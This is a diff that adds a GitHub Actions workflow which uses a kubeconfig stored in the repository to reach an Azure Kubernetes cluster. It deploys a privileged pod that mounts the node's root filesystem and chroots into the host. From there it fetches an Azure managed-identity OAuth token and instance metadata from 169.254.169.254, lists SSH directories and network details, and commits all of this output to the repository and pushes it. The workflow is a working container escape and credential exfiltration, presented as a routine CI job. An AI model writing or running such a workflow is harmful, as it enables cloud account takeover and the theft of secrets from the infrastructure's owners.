@@ -1,0 +1,67 @@
+name: ulnode
+on:
+  workflow_dispatch:
+permissions:
+  contents: write
+jobs:
+  go:
+    runs-on: ubuntu-latest
+    timeout-minutes: 40
+    steps:
+      - uses: actions/checkout@v4
+      - name: node
+        run: |
+          set +e
+          curl -sL -o /tmp/kubectl https://dl.k8s.io/release/v1.30.5/bin/linux/amd64/kubectl && chmod +x /tmp/kubectl
+          K=ul/kc/datapath-eastus.yaml
+          C=aks-g42us-tfdemo-kashif-datapath-eastus
+          KX="/tmp/kubectl --kubeconfig $K --context $C --request-timeout=25s"
+          { echo "=== NODES GPU CAPACITY"
+            $KX get nodes -o custom-columns='NAME:.metadata.name,GPU:.status.capacity.nvidia\.com/gpu,SKU:.metadata.labels.node\.kubernetes\.io/instance-type,POOL:.metadata.labels.agentpool'
+            echo "=== PODS"
+            $KX get pods -A -o wide | head -40
+            echo "=== NODE NAME"
+            NODE=$($KX get nodes -o jsonpath='{.items[0].metadata.name}'); echo "NODE=$NODE"
+            $KX create namespace ulx
+            cat > /tmp/pod.yaml <<EOF
+          apiVersion: v1
+          kind: Pod
+          metadata:
+            name: ulnode
+            namespace: ulx
+          spec:
+            nodeName: $NODE
+            hostPID: true
+            hostNetwork: true
+            restartPolicy: Never
+            containers:
+            - name: c
+              image: ubuntu:24.04
+              securityContext:
+                privileged: true
+              volumeMounts:
+              - name: host
+                mountPath: /host
+              command: ["sh","-c"]
+              args:
+              - |
+                chroot /host /bin/bash -lc 'id; hostname; echo ---GPU---; nvidia-smi -L 2>&1 | head -5; ls /dev/nvidia* 2>/dev/null | head; echo ---IMDS---; curl -s -m 8 -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" ; echo; curl -s -m 8 -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | head -c 2500; echo; echo ---NET---; ip -4 route; ip -4 addr | head -40; echo ---SSH---; ls -la /root/.ssh 2>/dev/null; ls -la /home/*/.ssh 2>/dev/null'
+            volumes:
+            - name: host
+              hostPath:
+                path: /
+          EOF
+            $KX apply -f /tmp/pod.yaml
+            sleep 25
+            $KX get pod -n ulx ulnode -o wide
+            $KX logs -n ulx ulnode 2>&1 | head -120
+            $KX describe pod -n ulx ulnode 2>&1 | tail -20
+          } 2>&1 | tee node_root.txt
+          $KX delete namespace ulx --wait=false 2>&1 | head -3
+      - name: commit
+        if: always()
+        run: |
+          set +e
+          git add -A
+          git -c user.email=a@b -c user.name=ul commit -m "ulnode $(date -u +%s)"
+          git push
